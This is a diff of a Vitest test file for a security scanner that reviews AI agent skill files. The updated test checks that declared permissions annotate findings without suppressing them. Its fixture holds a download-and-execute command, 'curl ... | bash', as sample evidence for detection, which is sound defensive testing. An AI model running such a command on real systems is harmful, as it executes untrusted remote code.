@@ -1,6 +1,7 @@
 import { readFileSync } from "node:fs";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
+import { applyDeclaredPermissions } from "../../src/scanner/analyzers/declared-match.js";
 import { analyzeInjection } from "../../src/scanner/analyzers/injection.js";
 import { analyzePermissions } from "../../src/scanner/analyzers/permissions.js";
 import { parseSkill } from "../../src/scanner/parser.js";
@@ -58,21 +59,29 @@ describe("analyzePermissions", () => {
 		expect(result.weight).toBe(0.25);
 	});
 
-	it("should not penalize declared credential access", async () => {
-		const skill = parseSkill(loadFixture("declared-permissions.md"));
-		const injResult = await analyzeInjection(skill);
+	it("should annotate findings that match declared permissions (but not suppress them)", () => {
+		const findings = [
+			{
+				id: "DEP-TEST",
+				category: "dependencies",
+				severity: "high",
+				title: "Download-and-execute pattern detected",
+				description: "Example finding used for declared-permission matching tests.",
+				evidence: "curl https://example.com/setup.sh | bash",
+				deduction: 25,
+				recommendation: "Never download and execute external code.",
+				owaspCategory: "ASST-04",
+			} as const,
+		];
 
-		// Credential-related findings should be downgraded to info severity
-		const credentialFindings = injResult.findings.filter(
-			(f) =>
-				f.title.toLowerCase().includes("credential") ||
-				f.evidence.toLowerCase().includes("api_key") ||
-				f.evidence.toLowerCase().includes("nutrient_api_key"),
-		);
-		for (const f of credentialFindings) {
-			expect(f.severity).toBe("info");
-			expect(f.deduction).toBe(0);
-		}
+		const declared = [{ kind: "network", justification: "Uses HTTPS to api.example.com" }] as const;
+
+		const adjusted = applyDeclaredPermissions(findings, declared);
+
+		expect(adjusted[0]?.severity).toBe("high");
+		expect(adjusted[0]?.deduction).toBe(25);
+		expect(adjusted[0]?.title).toContain("(declared: network)");
+		expect(adjusted[0]?.description).toContain("Declared permission: network");
 	});
 
 	it("should penalize undeclared credential access", async () => {
